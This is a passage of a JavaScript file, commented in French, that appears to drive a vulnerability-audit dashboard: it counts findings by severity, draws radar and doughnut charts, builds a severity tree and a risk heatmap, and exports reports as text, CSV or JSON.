    var treeContainer = document.getElementById('vuln-tree-container');
    if (treeContainer) {
        treeContainer.innerHTML = '<p style="color: #888; text-align: center; padding: 40px;">⚠️ No audit report selected.<br>Go to "Enumeration Results" tab and select a report first.</p>';
    }
    
    var heatmapContainer = document.getElementById('heatmap-container');
    if (heatmapContainer) {
        heatmapContainer.innerHTML = '<p style="color: #888; text-align: center;">Select an audit report to view risk heatmap</p>';
    }
    
    // Mettre à jour les KPIs à zéro
    document.getElementById('kpi-critical').innerText = '0';
    document.getElementById('kpi-high').innerText = '0';
    document.getElementById('kpi-medium').innerText = '0';
    document.getElementById('kpi-low').innerText = '0';
    document.getElementById('kpi-total').innerText = '0';
}

function renderVulnerabilityGraphs(auditData) {
    if (!auditData) return;
    
    var findings = auditData.findings || [];
    var system = auditData.system || {};
    
    // 1. Compter par sévérité
    var severityCount = { critical: 0, high: 0, medium: 0, low: 0 };
    for (var i = 0; i < findings.length; i++) {
        var severity = (findings[i].severity || '').toLowerCase();
        if (severity === 'critical') severityCount.critical++;
        else if (severity === 'high') severityCount.high++;
        else if (severity === 'medium') severityCount.medium++;
        else if (severity === 'low') severityCount.low++;
        else severityCount.medium++;
    }
    
    // 2. Mettre à jour les KPIs
    document.getElementById('kpi-critical').innerText = severityCount.critical;
    document.getElementById('kpi-high').innerText = severityCount.high;
    document.getElementById('kpi-medium').innerText = severityCount.medium;
    document.getElementById('kpi-low').innerText = severityCount.low;
    document.getElementById('kpi-total').innerText = findings.length;
    
    // 3. Graphique Radar - par type (CORRIGÉ)
    var typeCount = {};
    for (var i = 0; i < findings.length; i++) {
        var type = findings[i].type || 'Other';
        var cleanType = type.split('(')[0].trim();
        if (!typeCount[cleanType]) typeCount[cleanType] = 0;
        typeCount[cleanType]++;
    }
    
    var radarCtx = document.getElementById('radar-chart');
    if (radarCtx && typeof Chart !== 'undefined') {
        if (radarChart) radarChart.destroy();
        radarChart = new Chart(radarCtx, {
            type: 'radar',
            data: {
                labels: Object.keys(typeCount),
                datasets: [{
                    label: 'Vulnerabilities by Type',
                    data: Object.values(typeCount),
                    backgroundColor: 'rgba(59, 130, 246, 0.2)',
                    borderColor: '#3b82f6',
                    pointBackgroundColor: '#ef4444',
                    pointBorderColor: '#ffffff',
                    pointRadius: 5,
                    pointHoverRadius: 7
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: true,
                plugins: {
                    legend: {
                        position: 'top',
                        labels: { font: { size: 10 } }
                    },
                    tooltip: {
                        callbacks: {
                            label: function(context) {
                                return context.dataset.label + ': ' + context.raw;
                            }
                        }
                    }
                },
                scales: {
                    r: {
                        beginAtZero: true,
                        ticks: {
                            stepSize: 1,
                            backdropColor: 'transparent',
                            font: { size: 9 }
                        },
                        // ✅ CORRECTION : Rapprocher les étiquettes du centre
                        pointLabels: {
                            font: { size: 10, weight: 'bold' },
                            color: '#cbd5e1',
                            // Centre les étiquettes (les rapproche du centre)
                            centerPointLabels: true
                        },
                        grid: {
                            circular: true,
                            color: 'rgba(59, 130, 246, 0.15)'
                        },
                        angleLines: {
                            color: 'rgba(59, 130, 246, 0.2)'
                        }
                    }
                },
                // Ajuster l'espacement global
                layout: {
                    padding: {
                        top: 10,
                        bottom: 10,
                        left: 10,
                        right: 10
                    }
                }
            }
        });
    }
    
    // 4. Graphique Doughnut
    var doughnutCtx = document.getElementById('doughnut-chart');
    if (doughnutCtx && typeof Chart !== 'undefined') {
        if (doughnutChart) doughnutChart.destroy();
        doughnutChart = new Chart(doughnutCtx, {
            type: 'doughnut',
            data: {
                labels: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'],
                datasets: [{
                    data: [severityCount.critical, severityCount.high, severityCount.medium, severityCount.low],
                    backgroundColor: ['#ef4444', '#f97316', '#eab308', '#22c55e'],
                    borderWidth: 0
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: true,
                plugins: { 
                    legend: { 
                        position: 'bottom',
                        labels: { font: { size: 10 } }
                    }
                }
            }
        });
    }
    
    // 5. Arbre d'attaque
    renderVulnerabilityTree(findings);
    
    // 6. Heatmap
    renderRiskHeatmap(findings);
}
function renderVulnerabilityTree(findings) {
    var container = document.getElementById('vuln-tree-container');
    if (!container) return;
    
    var groups = { critical: [], high: [], medium: [], low: [] };
    
    for (var i = 0; i < findings.length; i++) {
        var f = findings[i];
        var severity = (f.severity || '').toLowerCase();
        if (groups[severity]) groups[severity].push(f);
        else groups.medium.push(f);
    }
    
    var html = '<ul class="vuln-tree" style="list-style: none; padding-left: 0;">';
    var severityOrder = ['critical', 'high', 'medium', 'low'];
    var icons = { critical: '🔴', high: '🟠', medium: '🟡', low: '🟢' };
    
    for (var s = 0; s < severityOrder.length; s++) {
        var severity = severityOrder[s];
        var items = groups[severity];
        if (items.length === 0) continue;
        
        html += '<li style="margin: 8px 0;">';
        html += '<details open><summary style="cursor: pointer; font-weight: bold; color: ' + 
                (severity === 'critical' ? '#ef4444' : severity === 'high' ? '#f97316' : severity === 'medium' ? '#eab308' : '#22c55e') + '">';
        html += icons[severity] + ' ' + severity.toUpperCase() + ' (' + items.length + ' vulnerabilities)';
        html += '</summary><ul style="margin-top: 8px; margin-left: 20px;">';
        
        for (var i = 0; i < items.length; i++) {
            var displayName = items[i].target ? items[i].target.split('(')[0].trim() : (items[i].name || 'Unknown');
            html += '<li style="margin: 4px 0; font-family: monospace; font-size: 11px;">';
            html += '🔧 <strong>' + (items[i].type || 'Unknown') + '</strong>';
            html += ' → ' + displayName;
            if (items[i].evidencePath) {
                html += '<br><span style="color: #666; font-size: 9px; margin-left: 20px;">📁 ' + items[i].evidencePath + '</span>';
            }
            html += '</li>';
        }
        html += '</ul></details></li>';
    }
    html += '</ul>';
    
    if (findings.length === 0) {
        html = '<p style="color: #888; text-align: center; padding: 40px;">✅ No vulnerabilities found in this audit report.</p>';
    }
    
    container.innerHTML = html;
}

function renderRiskHeatmap(findings) {
    var container = document.getElementById('heatmap-container');
    if (!container) return;
    
    // Calculer le score de risque par catégorie
    var categories = {};
    var severityScores = { critical: 4, high: 3, medium: 2, low: 1 };
    
    for (var i = 0; i < findings.length; i++) {
        var cat = findings[i].type || 'Other';
        var cleanCat = cat.split('(')[0].trim();
        var severity = (findings[i].severity || 'medium').toLowerCase();
        var score = severityScores[severity] || 2;
        
        if (!categories[cleanCat]) {
            categories[cleanCat] = { totalScore: 0, count: 0 };
        }
        categories[cleanCat].totalScore += score;
        categories[cleanCat].count++;
    }
    
    // Convertir en array pour trier par score
    var sortedCategories = Object.keys(categories).map(function(cat) {
        return {
            name: cat,
            score: categories[cat].totalScore,
            count: categories[cat].count,
            avgScore: categories[cat].totalScore / categories[cat].count
        };
    }).sort(function(a, b) { return b.score - a.score; });
    
    // Trouver le score max pour l'intensité
    var maxScore = sortedCategories.length > 0 ? sortedCategories[0].score : 1;
    
    var html = '<div style="display: flex; flex-direction: column; gap: 8px;">';
    
    for (var i = 0; i < sortedCategories.length; i++) {
        var cat = sortedCategories[i];
        var intensity = (cat.score / maxScore) * 100;
        var color = '';
        
        if (intensity >= 75) color = '#ef4444';
        else if (intensity >= 50) color = '#f97316';
        else if (intensity >= 25) color = '#eab308';
        else color = '#22c55e';
        
        html += '<div style="background: #1a1a2e; border-radius: 4px; padding: 8px;">';
        html += '<div style="display: flex; justify-content: space-between; margin-bottom: 4px;">';
        html += '<span style="font-weight: bold;">' + cat.name + '</span>';
        html += '<span style="font-family: monospace;">Risk Score: ' + cat.score + ' (' + cat.count + ' findings)</span>';
        html += '</div>';
        html += '<div style="background: #2a2a3e; border-radius: 3px; overflow: hidden;">';
        html += '<div style="width: ' + intensity + '%; background: ' + color + '; height: 6px; transition: width 0.3s;"></div>';
        html += '</div>';
        html += '</div>';
    }
    
    html += '</div>';
    
    if (sortedCategories.length === 0) {
        html = '<p style="color: #888; text-align: center; padding: 40px;">No vulnerability data to display</p>';
    }
    
    container.innerHTML = html;
}

// Exporter les fonctions pour qu'elles soient accessibles globalement
window.renderVulnerabilityGraphs = renderVulnerabilityGraphs;

// Fonctions de rapport
window.generateSecurityReport = function() {
    var auditReport = window.selectedAuditReportDetail;
    if (!auditReport || !auditReport.report_json) {
        toast('Please select an audit report first', 'error');
        return;
    }
    var data = JSON.parse(auditReport.report_json);
    var findings = data.findings || [];
    var system = data.system || {};
    
    var reportContent = '=== SECURITY ASSESSMENT REPORT ===\n\n';
    reportContent += 'Generated: ' + new Date().toLocaleString() + '\n\n';
    reportContent += '=== SYSTEM INFORMATION ===\n';
    reportContent += 'Machine: ' + (system.MachineName || 'N/A') + '\n';
    reportContent += 'User: ' + (system.UserName || 'N/A') + '\n';
    reportContent += 'Admin: ' + (system.IsAdministrator ? 'YES' : 'NO') + '\n\n';
    reportContent += '=== VULNERABILITY SUMMARY ===\n';
    reportContent += 'Total Findings: ' + findings.length + '\n';
    
    var criticalCount = 0, highCount = 0;
    for (var i = 0; i < findings.length; i++) {
        var sev = (findings[i].severity || '').toUpperCase();
        if (sev === 'CRITICAL') criticalCount++;
        else if (sev === 'HIGH') highCount++;
    }
    reportContent += 'Critical: ' + criticalCount + '\n';
    reportContent += 'High: ' + highCount + '\n\n';
    reportContent += '=== DETAILED FINDINGS ===\n';
    
    for (var i = 0; i < findings.length; i++) {
        reportContent += (i+1) + '. [' + (findings[i].severity || 'UNKNOWN') + '] ' + (findings[i].type || 'Unknown') + '\n';
        reportContent += '   Target: ' + (findings[i].target || 'N/A') + '\n';
        if (findings[i].evidencePath) reportContent += '   Path: ' + findings[i].evidencePath + '\n';
        reportContent += '\n';
    }
    
    var blob = new Blob([reportContent], { type: 'text/plain' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'security_report_' + (system.MachineName || 'unknown') + '_' + Date.now() + '.txt';
    a.click();
    URL.revokeObjectURL(url);
    toast('Report generated!', 'success');
};

window.exportCSV = function() {
    var auditReport = window.selectedAuditReportDetail;
    if (!auditReport || !auditReport.report_json) {
        toast('Please select an audit report first', 'error');
        return;
    }
    var data = JSON.parse(auditReport.report_json);
    var findings = data.findings || [];
    
    var csv = 'Severity,Type,Target,Evidence Path\n';
    for (var i = 0; i < findings.length; i++) {
        csv += '"' + (findings[i].severity || '') + '",';
        csv += '"' + (findings[i].type || '') + '",';
        csv += '"' + (findings[i].target || '') + '",';
        csv += '"' + (findings[i].evidencePath || '') + '"\n';
    }
    
    var blob = new Blob([csv], { type: 'text/csv' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'vulnerability_report_' + Date.now() + '.csv';
    a.click();
    URL.revokeObjectURL(url);
    toast('CSV exported!', 'success');
};

window.copyReportJson = function() {
    var auditReport = window.selectedAuditReportDetail;
    if (!auditReport || !auditReport.report_json) {
        toast('Please select an audit report first', 'error');
        return;
    }
    navigator.clipboard.writeText(auditReport.report_json);
    toast('JSON copied to clipboard!', 'success');
};

// Initialisation
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initVulnerabilityTab);
} else {
    initVulnerabilityTab();
}